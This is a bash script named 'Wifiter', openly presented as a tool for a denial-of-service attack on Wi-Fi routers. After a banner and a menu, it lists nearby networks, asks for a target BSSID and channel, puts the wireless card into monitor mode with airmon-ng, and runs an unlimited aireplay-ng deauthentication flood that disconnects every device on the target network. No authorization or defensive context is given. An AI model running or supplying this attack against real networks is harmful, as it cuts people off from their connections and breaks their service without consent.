#!/bin/bash

#desclaimer/description
#################################################
#		      Wifiter 		        #	
#################################################
#   Bash Script to Perfrom DOS on Wifi-Router   #
#      Version: 3.0				#
#	Author: naqviO7 *saqlainnaqvi*          #
#################################################

#STARTOFCODE

#colors used in this script
red='\e[1;31m'
cyan='\e[0;36m'
yellow='\e[0;33m'
orange='\e[38;5;166m'
lightgreen='\e[1;32m'
RESET="\033[00m"

clear 


#function to check if user is rootUser
function isroot_user(){
    echo $orange
    if [[ $EUID -ne 0 ]]; then
        sleep 2
        
        echo -e "Run This Script Under Root Previlages!\n" 
        sleep 2
                echo -e 'Quitting...\n'
        sleep 2
        exit 1
    fi
}


#function to diplay banner 
function wifter_banner(){
	echo $lightgreen && sleep 3
    echo -e "    
           _  _______
 __      _(_)/ _(_) |_ ___ _ __ 
 \ \ /\ / / | |_| | __/ _ \ '__|
  \ V  V /| |  _| | ||  __/ |   
   \_/\_/ |_|_| |_|\__\___|_|   
                    Version 3.0
                    	by naqviO7\n"
}



#function to display emoji
function wifiter_symbol(){
    echo $orange  && sleep 2
    echo "     (  (   O   )  )   "
    echo "           / \         "
    echo "          /   \        "
    echo -e '\n'
}


#function displaying main menu
function wifiter_menu(){
    echo $lightgreen && sleep 2
    echo -e " -----------------------------------------------
             |              W  I  F  T  E  R                 |                    
              -----------------------------------------------
             |   [+] 1. Perform DOS Attack                   |
             |   [+] 0. Quit                                 |
             |_______________________________________________| \n"
}


#fucntion to perform dos attack
function dos_attack(){
    echo $RESET 
    echo -e '------------------------------ Dislaying Available Routers ------------------------------\n' 
    sleep 2
    #command to display routers
    nmcli dev wifi
    echo -e "\n------------------------------------------------------------------------------------------\n"

    echo $cyan
    
    #taking bssid and chanel from user to perform dos attack
    read -p "[+] Enter BSSID of Router: " bssid
	read -p "[+] Enter Channel of Router: " channel	
	sleep 1 && echo -e "\n"

    #displaying warnings and exceptions to User
    echo $red
    echo -e "[!] Wifi will be Unavailable!\n" 
    sleep 2
    echo -e "[-] Press ( ctrl + c ) to Stop Attack!\n" 
    sleep 2

    #fancy output
    echo $yellow
    echo -e "[+] Enabling Monitor Mode...\n"
    sleep 2 
    echo -e "[+] De-Authenticating Devices...\n"
    sleep 2 
    echo -e '[+] Starting Attack...\n'
    sleep 2 

    echo $red
    echo "[!] DOS Started!"
    sleep 2 

    #main attack on router
    airmon-ng start wlan0 > /dev/null
	airodump-ng --bssid $bssid --channel $channel wlan0mon > /dev/null & sleep 5 ; kill $! 
	aireplay-ng --deauth 0 -a $bssid wlan0mon > /dev/null

}


#main function from where execution of code starts
#all functions are called here
function __main__(){
    #callign functions
    isroot_user
    wifter_banner
    wifiter_symbol
    wifiter_menu

    sleep 2

    echo $cyan
    read -p 'Enter Option to Perform: ' opt

    if [ "$opt" == "1" ]; then
        dos_attack
    
    elif [ "$opt" == "0" ]; then
        echo $red

        sleep 2
        echo -e "Quitting...\nThanks For Using!"
        
        sleep 2
        exit 1
    fi
}

#calling main function
__main__
#ENDOFCODE
